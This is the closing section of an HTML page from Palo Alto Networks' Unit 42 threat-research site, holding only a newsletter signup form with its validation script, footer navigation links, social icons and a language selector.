            </figure>
          </div>
        </div>

      </div>
    </section>
  </main>
<!--  Start: Footer subscription form -->
<div class="newsletter">
      <div class="l-container">
        <div class="newsletter__wrapper">
          <div class="image__wrapper"> 
            <picture>
			              	 <source media="(max-width:400px)" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/newsletter-Image-mobile.webp">
			  			               	 <source media="(max-width:949px)" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/newsletter-Image-tab.webp">
			  			  			  	<img src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/Revitalized_newsletter-Image-desktop-copy-1.webp" alt="Newsletter">
			              </picture>
          </div>
          <div class="content__wrapper"> 
		    							<span class="pre-title"> 
				<img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/palo-alto-logo-small.svg" alt="UNIT 42 Small Logo">
				Get updates from Unit 42			</span>
						           	 <h2>Peace of mind comes from staying ahead of threats. Contact us today.</h2>
			            <form action="https://www.paloaltonetworks.com/apps/pan/public/formsubmithandler.submitform.json" method="post" novalidate class="subscribe-form" name="Unit42_Subscribe" id="unit42footerSubscription_form">
              <input type="hidden" name="emailFormMask" value="">
              <input type="hidden" value="1086" name="formid">
              <input type="hidden" value="531-OCS-018" name="munchkinId">
              <input type="hidden" value="2141" name="lpId">
              <input type="hidden" value="1203" name="programId">
              <input type="hidden" value="1086" name="formVid">
              <input type="hidden" name="mkto_optinunit42" value="true">
              <input type="hidden" name="mkto_opt-in" value="true">
              <div class="form-group"> 
                <label for="newsletter-email"  id="newsletter-email-label">Your Email</label>
                <input type="emal" placeholder="Your Email" name="Email"  class="subscribe-field" id="newsletter-email" aria-labelledby="newsletter-email-label">
                <p class="error-mail mb-15 text-danger" style="color: #dc3545"></p>
				<p>Subscribe for email updates to all Unit 42 threat research.<br />By submitting this form, you agree to our <a title="Terms of Use" href="https://www.paloaltonetworks.com/legal-notices/terms-of-use" data-page-track="true" data-page-track-value="Get updates from Unit 42:Terms of Use">Terms of Use</a> and acknowledge our <a title="Privacy Statement" href="https://www.paloaltonetworks.com/legal-notices/privacy" data-page-track="true" data-page-track-value="Get updates from Unit 42:Privacy Statement">Privacy Statement.</a></p>
                <div class="g-recaptcha" data-expired-callback="captchaExpires" data-callback="captchaComplete" data-sitekey="6Lc5EhgTAAAAAJa-DzE7EeWABasWg4LKv-R3ao6o"></div>
                <p class="error-recaptcha d-none mt-15 text-danger" style="color: #dc3545">Invalid captcha!</p>
                <button class="l-btn is-disabled" data-page-track="true" data-page-track-value="footer:Get updates from Unit 42:Subscribe" id="unit42footerSubscription_form_button"> 
					Subscribe					<img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/right-arrow.svg" alt="Right Arrow"  class="arrow">
					<img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-loader.svg" alt="loader" class="loader">
			   </button>
				<div class="form-success-message"></div>
              </div>
            </form>
          </div>
        </div>
      </div>
    </div>

<script>

(function($) {
	// Migrated from the unit42-v5 + Modifications
	var subscribeSuccess = false;
	var email = document.getElementById('newsletter-email');
	var subscription_form = document.getElementById('unit42footerSubscription_form');
	var subscription_form_button = document.getElementById('unit42footerSubscription_form_button');
	window.captchaComplete = function() {
		subscribeSuccess = true;
		if ($(mail).val() != '' && isEmail($(mail).val())) {
			$(subscription_form_button).removeClass('is-disabled');
		}
		setTimeout(function() {
			$(email).focus();
			$('.g-recaptcha iframe').attr('tabindex', '-1');
		}, 100)
	}
	window.captchaExpires = function() {
		subscribeSuccess = false;
		$(subscription_form_button).addClass('is-disabled', true);
	} 
	$(subscription_form).submit(function(e) {
		e.preventDefault();
		e.stopImmediatePropagation();
		updateEmailMask();
		var success = true;
		var form = $(this);
		var mail = form.find('input[name="Email"]');
		
		if (mail.val() === '') {
			mail.addClass('has-error');
			showError(1);
			success = false;	
		}  else if (!isEmail(mail.val())){
			showError(2);
			success = false;
		}
		else {
			mail.removeClass('has-error');
			$('.error-mail').addClass('d-none');
		}

		if (!subscribeSuccess) {
			$('.error-recaptcha').removeClass('d-none');
		} else {
			$('.error-recaptcha').addClass('d-none');
		}

		if (success && subscribeSuccess) {
			$.ajax({
				type: 'POST',
				url: form.attr('action'),
				data: form.serialize(),
				beforeSend: function() {
                 form.find('button').addClass('is-loading');
    			},
				success: function(msg) {
					form.find('.form-success-message').html('<p class="success-message">You have been successfully subscribed</p>');
					form.find('button').removeClass('is-loading');
					$(email).val('');
					clearError();
				},
				error: function(jqXHR, textStatus, errorThrown) {
					$(subscription_form_button).addClass('is-disabled', true);
					form.find('button').removeClass('is-loading');
					
				}
			});
		}
		return false;
	});
	function showError(error_type){
		if(error_type == 1) {
			$('.error-mail').text("Please enter the email address.").addClass('error-show');
			$(subscription_form_button).addClass('is-disabled');
		} else if(error_type == 2){
			$('.error-mail').text("Please provide a valid e-mail address.").addClass('error-show');
			$(subscription_form_button).addClass('is-disabled');
		}	
		$(subscription_form_button).removeClass('is-loading');
	}
	function clearError(){
		$('.error-mail').text("").removeClass('error-show');;
		$(subscription_form_button).removeClass('is-loading');
		$(subscription_form_button).removeClass('is-disabled');
	}
	
	$(email).on('input', function (event) { 
		var email = $(this).val();
		if (isEmail(email) ) {			
			clearError();
		} else if(email == ""){
			clearError();
		} else{
			showError(2);			  
		}
    });

	function isEmail(email) {
		var re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
		return re.test(String(email).toLowerCase());
	}
	
	var captcha_loaded = false;
         if(!captcha_loaded){
            // recaptcha on foucs call
            $(document).on('change paste keyup', '#newsletter-email', function () {
               if($('.g-recaptcha').hasClass('d-none')){
                $('.g-recaptcha').removeClass('d-none');
               }
               if(!captcha_loaded ){
                  captcha_loaded  = true;
                  // trigger loading api.js (recaptcha.js) script
                  var head = document.getElementsByTagName('head')[0];
                  var script = document.createElement('script');
                  script.type = 'text/javascript';
                  script.src = 'https://www.google.com/recaptcha/api.js?hl=en_US';
                  head.appendChild(script);
               }
            });
        }
	
	function updateEmailMask() {
		var email = $("#unit42footerSubscription_form input[name='Email']").val();
		if (email && email.trim() != '') {
			var maskedEmail = maskEmailAddress(email);
			$("#unit42footerSubscription_form input[name='emailFormMask']").val(maskedEmail);
		}
	}

	function maskEmailAddress (emailAddress) {
		function mask(str) {
			var strLen = str.length;
			if (strLen > 4) {
				return str.substr(0, 1) + str.substr(1, strLen - 1).replace(/\w/g, '*') + str.substr(-1,1);
			}
			return str.replace(/\w/g, '*');
		}
		return emailAddress.replace(/([\w.]+)@([\w.]+)(\.[\w.]+)/g, function (m, p1, p2, p3) {
			return mask(p1) + '@' + mask(p2) + p3;
		});

		return emailAddress;
	}

}(jQuery));
//# sourceMappingURL=main.js.map
	
</script>
<!--  End: Footer subscription form -->

<footer class="footer"> 
  <div class="footer-menu">
    <div class="l-container">
      <div class="footer-menu__wrapper">
        <div class="footer-menu-nav__wrapper">
                      <h3 class="footer-menu-nav__title">Products and services</h3>
                                <div class="nav-column__wrapper"> 
            <div class="nav-column">
              													<nav>
					<ul class="footer-menu-nav__list"> 
																	<li class="footer-menu-nav__item nav-title"> 
							<a href="https://www.paloaltonetworks.com/network-security"   role="link" title="Network Security Platform" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform">Network Security Platform</a>
						</li>    
																	<li class="footer-menu-nav__item nav-title"> 
							<a href="https://www.paloaltonetworks.com/network-security/security-subscriptions"   role="link" title="CLOUD DELIVERED SECURITY SERVICES" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES">CLOUD DELIVERED SECURITY SERVICES</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/network-security/advanced-threat-prevention" target=_blank  role="link" title="Advanced Threat Prevention" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES:Advanced Threat Prevention">Advanced Threat Prevention</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/network-security/advanced-dns-security"   role="link" title="DNS Security" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES:Advanced Threat Prevention:DNS Security">DNS Security</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/network-security/enterprise-data-loss-prevention"   role="link" title="Data Loss Prevention" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES:Advanced Threat Prevention:DNS Security:Data Loss Prevention">Data Loss Prevention</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/network-security/enterprise-iot-security"   role="link" title="IoT Security" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES:Advanced Threat Prevention:DNS Security:Data Loss Prevention:IoT Security">IoT Security</a>
						</li>    
					        
					</ul>
				</nav>
																		<nav>
					<ul class="footer-menu-nav__list"> 
																	<li class="footer-menu-nav__item nav-title"> 
							<a href="https://www.paloaltonetworks.com/network-security/next-generation-firewall"   role="link" title="Next-Generation Firewalls" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES:Advanced Threat Prevention:DNS Security:Data Loss Prevention:IoT Security:Next-Generation Firewalls">Next-Generation Firewalls</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/network-security/next-generation-firewall-hardware"   role="link" title="Hardware Firewalls" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES:Advanced Threat Prevention:DNS Security:Data Loss Prevention:IoT Security:Next-Generation Firewalls:Hardware Firewalls">Hardware Firewalls</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/network-security/strata-cloud-manager"   role="link" title="Strata Cloud Manager" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES:Advanced Threat Prevention:DNS Security:Data Loss Prevention:IoT Security:Next-Generation Firewalls:Hardware Firewalls:Strata Cloud Manager">Strata Cloud Manager</a>
						</li>    
					        
					</ul>
				</nav>
																		<nav>
					<ul class="footer-menu-nav__list"> 
																	<li class="footer-menu-nav__item nav-title"> 
							<a href="https://www.paloaltonetworks.com/sase"   role="link" title="SECURE ACCESS SERVICE EDGE" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES:Advanced Threat Prevention:DNS Security:Data Loss Prevention:IoT Security:Next-Generation Firewalls:Hardware Firewalls:Strata Cloud Manager:SECURE ACCESS SERVICE EDGE">SECURE ACCESS SERVICE EDGE</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/sase/access"   role="link" title="Prisma Access" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES:Advanced Threat Prevention:DNS Security:Data Loss Prevention:IoT Security:Next-Generation Firewalls:Hardware Firewalls:Strata Cloud Manager:SECURE ACCESS SERVICE EDGE:Prisma Access">Prisma Access</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/sase/sd-wan"   role="link" title="Prisma SD-WAN" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES:Advanced Threat Prevention:DNS Security:Data Loss Prevention:IoT Security:Next-Generation Firewalls:Hardware Firewalls:Strata Cloud Manager:SECURE ACCESS SERVICE EDGE:Prisma Access:Prisma SD-WAN">Prisma SD-WAN</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/sase/adem"   role="link" title="Autonomous Digital Experience Management" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES:Advanced Threat Prevention:DNS Security:Data Loss Prevention:IoT Security:Next-Generation Firewalls:Hardware Firewalls:Strata Cloud Manager:SECURE ACCESS SERVICE EDGE:Prisma Access:Prisma SD-WAN:Autonomous Digital Experience Management">Autonomous Digital Experience Management</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/sase/next-gen-casb"   role="link" title="Cloud Access Security Broker" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES:Advanced Threat Prevention:DNS Security:Data Loss Prevention:IoT Security:Next-Generation Firewalls:Hardware Firewalls:Strata Cloud Manager:SECURE ACCESS SERVICE EDGE:Prisma Access:Prisma SD-WAN:Autonomous Digital Experience Management:Cloud Access Security Broker">Cloud Access Security Broker</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/sase/ztna"   role="link" title="Zero Trust Network Access" data-page-track="true" data-page-track-value="footer:Products and services:Network Security Platform:CLOUD DELIVERED SECURITY SERVICES:Advanced Threat Prevention:DNS Security:Data Loss Prevention:IoT Security:Next-Generation Firewalls:Hardware Firewalls:Strata Cloud Manager:SECURE ACCESS SERVICE EDGE:Prisma Access:Prisma SD-WAN:Autonomous Digital Experience Management:Cloud Access Security Broker:Zero Trust Network Access">Zero Trust Network Access</a>
						</li>    
					        
					</ul>
				</nav>
						         
            </div>
            <div class="nav-column">
                          													<nav>
					<ul class="footer-menu-nav__list"> 
																	<li class="footer-menu-nav__item nav-title"> 
							<a href="https://www.paloaltonetworks.com/prisma/whyprisma"   role="link" title="Code to Cloud Platform" data-page-track="true" data-page-track-value="footer:Products and services:Code to Cloud Platform">Code to Cloud Platform</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/prisma/cloud"   role="link" title="Prisma Cloud" data-page-track="true" data-page-track-value="footer:Products and services:Code to Cloud Platform:Prisma Cloud">Prisma Cloud</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/content/pan/en_US/prisma/cloud/cloud-native-application-protection-platform"   role="link" title="Cloud-Native Application Protection Platform" data-page-track="true" data-page-track-value="footer:Products and services:Code to Cloud Platform:Prisma Cloud:Cloud-Native Application Protection Platform">Cloud-Native Application Protection Platform</a>
						</li>    
					        
					</ul>
				</nav>
						            </div>
            <div class="nav-column">
              													<nav>
					<ul class="footer-menu-nav__list"> 
																	<li class="footer-menu-nav__item nav-title"> 
							<a href="https://www.paloaltonetworks.com/cortex" target=_blank  role="link" title="AI-Driven Security Operations Platform" data-page-track="true" data-page-track-value="footer:Products and services:AI-Driven Security Operations Platform">AI-Driven Security Operations Platform</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/cortex/cortex-xdr"   role="link" title="Cortex XDR" data-page-track="true" data-page-track-value="footer:Products and services:AI-Driven Security Operations Platform:Cortex XDR">Cortex XDR</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/cortex/cortex-xsoar"   role="link" title="Cortex XSOAR" data-page-track="true" data-page-track-value="footer:Products and services:AI-Driven Security Operations Platform:Cortex XDR:Cortex XSOAR">Cortex XSOAR</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/cortex/cortex-xpanse"   role="link" title="Cortex Xpanse" data-page-track="true" data-page-track-value="footer:Products and services:AI-Driven Security Operations Platform:Cortex XDR:Cortex XSOAR:Cortex Xpanse">Cortex Xpanse</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/cortex/cortex-xsiam"   role="link" title="Cortex XSIAM" data-page-track="true" data-page-track-value="footer:Products and services:AI-Driven Security Operations Platform:Cortex XDR:Cortex XSOAR:Cortex Xpanse:Cortex XSIAM">Cortex XSIAM</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/cortex/cortex-xpanse/attack-surface-management"   role="link" title="External Attack Surface Protection" data-page-track="true" data-page-track-value="footer:Products and services:AI-Driven Security Operations Platform:Cortex XDR:Cortex XSOAR:Cortex Xpanse:Cortex XSIAM:External Attack Surface Protection">External Attack Surface Protection</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/cortex/security-operations-automation"   role="link" title="Security Automation" data-page-track="true" data-page-track-value="footer:Products and services:AI-Driven Security Operations Platform:Cortex XDR:Cortex XSOAR:Cortex Xpanse:Cortex XSIAM:External Attack Surface Protection:Security Automation">Security Automation</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/cortex/detection-and-response"   role="link" title="Threat Prevention, Detection &amp; Response" data-page-track="true" data-page-track-value="footer:Products and services:AI-Driven Security Operations Platform:Cortex XDR:Cortex XSOAR:Cortex Xpanse:Cortex XSIAM:External Attack Surface Protection:Security Automation:Threat Prevention, Detection &amp; Response">Threat Prevention, Detection &amp; Response</a>
						</li>    
					        
					</ul>
				</nav>
						            </div>
            <div class="nav-column">
              													<nav>
					<ul class="footer-menu-nav__list"> 
																	<li class="footer-menu-nav__item nav-title"> 
							<a href="https://www.paloaltonetworks.com/unit42"   role="link" title="Threat Intel and Incident Response Services" data-page-track="true" data-page-track-value="footer:Products and services:Threat Intel and Incident Response Services">Threat Intel and Incident Response Services</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/unit42/assess"   role="link" title="Proactive Assessments" data-page-track="true" data-page-track-value="footer:Products and services:Threat Intel and Incident Response Services:Proactive Assessments">Proactive Assessments</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/unit42/respond"   role="link" title="Incident Response" data-page-track="true" data-page-track-value="footer:Products and services:Threat Intel and Incident Response Services:Proactive Assessments:Incident Response">Incident Response</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/unit42/transform"   role="link" title="Transform Your Security Strategy" data-page-track="true" data-page-track-value="footer:Products and services:Threat Intel and Incident Response Services:Proactive Assessments:Incident Response:Transform Your Security Strategy">Transform Your Security Strategy</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/unit42/threat-intelligence-partners"   role="link" title="Discover Threat Intelligence" data-page-track="true" data-page-track-value="footer:Products and services:Threat Intel and Incident Response Services:Proactive Assessments:Incident Response:Transform Your Security Strategy:Discover Threat Intelligence">Discover Threat Intelligence</a>
						</li>    
					        
					</ul>
				</nav>
						            </div>
          </div>
        </div>
        <div class="footer-menu-nav__wrapper">
                      <h3 class="footer-menu-nav__title">Company</h3>
                                <div class="nav-column__wrapper">
          <div class="nav-column">
            													<nav>
					<ul class="footer-menu-nav__list"> 
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/about-us"   role="link" title="About Us" data-page-track="true" data-page-track-value="footer:Company:About Us">About Us</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://jobs.paloaltonetworks.com/en/"   role="link" title="Careers" data-page-track="true" data-page-track-value="footer:Company:About Us:Careers">Careers</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/company/contact-sales"   role="link" title="Contact Us" data-page-track="true" data-page-track-value="footer:Company:About Us:Careers:Contact Us">Contact Us</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/about-us/corporate-responsibility"   role="link" title="Corporate Responsibility" data-page-track="true" data-page-track-value="footer:Company:About Us:Careers:Contact Us:Corporate Responsibility">Corporate Responsibility</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/customers"   role="link" title="Customers" data-page-track="true" data-page-track-value="footer:Company:About Us:Careers:Contact Us:Corporate Responsibility:Customers">Customers</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://investors.paloaltonetworks.com/" target=_blank  role="link" title="Investor Relations" data-page-track="true" data-page-track-value="footer:Company:About Us:Careers:Contact Us:Corporate Responsibility:Customers:Investor Relations">Investor Relations</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/about-us/locations"   role="link" title="Location" data-page-track="true" data-page-track-value="footer:Company:About Us:Careers:Contact Us:Corporate Responsibility:Customers:Investor Relations:Location">Location</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/company/newsroom"   role="link" title="Newsroom" data-page-track="true" data-page-track-value="footer:Company:About Us:Careers:Contact Us:Corporate Responsibility:Customers:Investor Relations:Location:Newsroom">Newsroom</a>
						</li>    
					        
					</ul>
				</nav>
						          </div>
          </div>
        </div>
        <div class="footer-menu-nav__wrapper">
                      <h3 class="footer-menu-nav__title">Popular links</h3>
                                <div class="nav-column__wrapper">
          <div class="nav-column">
            													<nav>
					<ul class="footer-menu-nav__list"> 
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/blog/"   role="link" title="Blog" data-page-track="true" data-page-track-value="footer:Popular links:Blog">Blog</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/communities"   role="link" title="Communities" data-page-track="true" data-page-track-value="footer:Popular links:Blog:Communities">Communities</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/resources"   role="link" title="Content Library" data-page-track="true" data-page-track-value="footer:Popular links:Blog:Communities:Content Library">Content Library</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/cyberpedia"   role="link" title="Cyberpedia" data-page-track="true" data-page-track-value="footer:Popular links:Blog:Communities:Content Library:Cyberpedia">Cyberpedia</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://events.paloaltonetworks.com/"   role="link" title="Event Center" data-page-track="true" data-page-track-value="footer:Popular links:Blog:Communities:Content Library:Cyberpedia:Event Center">Event Center</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://start.paloaltonetworks.com/preference-center"   role="link" title="Manage Email Preferences" data-page-track="true" data-page-track-value="footer:Popular links:Blog:Communities:Content Library:Cyberpedia:Event Center:Manage Email Preferences">Manage Email Preferences</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/products/products-a-z"   role="link" title="Products A-Z" data-page-track="true" data-page-track-value="footer:Popular links:Blog:Communities:Content Library:Cyberpedia:Event Center:Manage Email Preferences:Products A-Z">Products A-Z</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/legal-notices/trust-center/tech-certs"   role="link" title="Product Certifications" data-page-track="true" data-page-track-value="footer:Popular links:Blog:Communities:Content Library:Cyberpedia:Event Center:Manage Email Preferences:Products A-Z:Product Certifications">Product Certifications</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/security-disclosure"   role="link" title="Report a Vulnerability" data-page-track="true" data-page-track-value="footer:Popular links:Blog:Communities:Content Library:Cyberpedia:Event Center:Manage Email Preferences:Products A-Z:Product Certifications:Report a Vulnerability">Report a Vulnerability</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://www.paloaltonetworks.com/sitemap"   role="link" title="Sitemap" data-page-track="true" data-page-track-value="footer:Popular links:Blog:Communities:Content Library:Cyberpedia:Event Center:Manage Email Preferences:Products A-Z:Product Certifications:Report a Vulnerability:Sitemap">Sitemap</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://docs.paloaltonetworks.com/"   role="link" title="Tech Docs" data-page-track="true" data-page-track-value="footer:Popular links:Blog:Communities:Content Library:Cyberpedia:Event Center:Manage Email Preferences:Products A-Z:Product Certifications:Report a Vulnerability:Sitemap:Tech Docs">Tech Docs</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://unit42.paloaltonetworks.com/"   role="link" title="Unit 42" data-page-track="true" data-page-track-value="footer:Popular links:Blog:Communities:Content Library:Cyberpedia:Event Center:Manage Email Preferences:Products A-Z:Product Certifications:Report a Vulnerability:Sitemap:Tech Docs:Unit 42">Unit 42</a>
						</li>    
																	<li class="footer-menu-nav__item "> 
							<a href="https://panwedd.exterro.net/portal/dsar.htm?target=panwedd" target=_blank  role="link" title="Do Not Sell or Share My Personal Information" data-page-track="true" data-page-track-value="footer:Popular links:Blog:Communities:Content Library:Cyberpedia:Event Center:Manage Email Preferences:Products A-Z:Product Certifications:Report a Vulnerability:Sitemap:Tech Docs:Unit 42:Do Not Sell or Share My Personal Information">Do Not Sell or Share My Personal Information</a>
						</li>    
					        
					</ul>
				</nav>
						          </div>
          </div>
        </div>
      </div>
    </div>
  </div>
  <div class="footer-bottom"> 
    <div class="l-container"> 
              <div class="footer-logo">
          <a href="https://www.paloaltonetworks.com/" role="link" title="Footer Nav" data-page-track="true" data-page-track-value="footer:logo:Palo Alto Networks">
            <img width="245" height="46" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/palo-alto-footer-logo.svg" class="attachment-medium size-medium" alt="" decoding="async" loading="lazy" />          </a>
        </div>
            <div class="footer-bottom__wrapper"> 
        <div class="footer-bottom-nav">
                                              <nav>
                <ul class="footer-menu-nav__list"> 
                                                    <li> 
                   <a href="https://www.paloaltonetworks.com/legal-notices/privacy"   role="link" title="Privacy" data-page-track="true" data-page-track-value="footer:bottom-menu:Privacy">Privacy</a>
                  </li>    
                                                    <li> 
                   <a href="https://www.paloaltonetworks.com/legal-notices/trust-center"   role="link" title="Trust Center" data-page-track="true" data-page-track-value="footer:bottom-menu:Trust Center">Trust Center</a>
                  </li>    
                                                    <li> 
                   <a href="https://www.paloaltonetworks.com/legal-notices/terms-of-use"   role="link" title="Terms of Use" data-page-track="true" data-page-track-value="footer:bottom-menu:Terms of Use">Terms of Use</a>
                  </li>    
                                                    <li> 
                   <a href="https://www.paloaltonetworks.com/legal"   role="link" title="Documents" data-page-track="true" data-page-track-value="footer:bottom-menu:Documents">Documents</a>
                  </li>    
                        
                </ul>
              </nav>
                                            <br/><span class="copyright">Copyright © 2024 Palo Alto Networks. All Rights Reserved</span>
                  </div>
        <div class="footer-bottom-social"> 
          <ul> 
			<li>
			<a href="https://www.youtube.com/user/paloaltonetworks" target="_blank" role="link" title="YouTube" data-page-track="true" data-page-track-value="footer:social:Youtube">
				<img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/youtube-black.svg" alt="YouTube">
			</a>
		</li>
				<li> 
			<a href="https://twitter.com/Unit42_Intel" target="_blank" role="link" title="X" data-page-track="true" data-page-track-value="footer:social::Twitter">
				<img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/x-icon-black.svg" alt="Twitter">
			</a>
		</li>
				<li> 
			<a href="https://www.facebook.com/PaloAltoNetworks/" target="_blank" role="link" title="Facebook" data-page-track="true" data-page-track-value="footer:social:Facebook">
				<img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/Facebook_Icon.svg" alt="Facebook">
			</a>
		</li>
				<li> 
			<a href="https://www.linkedin.com/company/palo-alto-networks" target="_blank" role="link" title="LinkedIn" data-page-track="true" data-page-track-value="footer:social:LinkedIn">
				<img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/LinkedIn_Icon.svg" alt="LinkedIn">
			</a>
		</li>
	                <li> 
			<a href="https://unit42.paloaltonetworks.com/unit-42-threat-vector-podcast/" role="link" title="Podcast" data-page-track="true" data-page-track-value="footer:social:Podcast">
				<img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/Podcast.svg" alt="Podcast">
			</a>
		</li>
</ul>          
	<div class="pa language-dropdown">
			<div class="language-dropdown__wrapper"> 
			<img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/globe-icon.svg" alt="Globe icon">
			<span id="selectedLanguage">EN</span>
			<img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/down-arrow.svg" alt="Down arrow"><ul><li class="title">Select your language</li>
					<li class="selected" data-value="en"> 
						<a data-page-track="true" data-page-track-value="footer:language-selector:en" href="https://unit42.paloaltonetworks.com/molerats-delivers-spark-backdoor/">USA (ENGLISH)</a>
					</li>
					<li class="non-active" data-value="en"> 
						<a data-page-track="true" data-page-track-value="footer:language-selector:ja" href="https://unit42.paloaltonetworks.jp/molerats-delivers-spark-backdoor/">JAPAN (日本語)</a>
					</li></ul>        </div>
      </div>
    </div>
  </div>
</footer>
<div class="dd-overlay">
</div>
<!--  Start: video modal -->
<div class="modal video__modal" id="videoModal" tabindex="-1">
        <div class="modal__video-wrapper">
          <button class="modal__play-btn is-minimized is-paused" id="playPauseBtn">
            <img class="play" src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/player-play-icon.svg" alt="Play">
            <img class="pause" src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/player-pause-icon1.svg" alt="Pause">
          </button>
          <button class="modal__minimize-btn is-minimized">
            <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-minimize.svg" alt="Minimize">
          </button>
          <button class="modal__close"> 
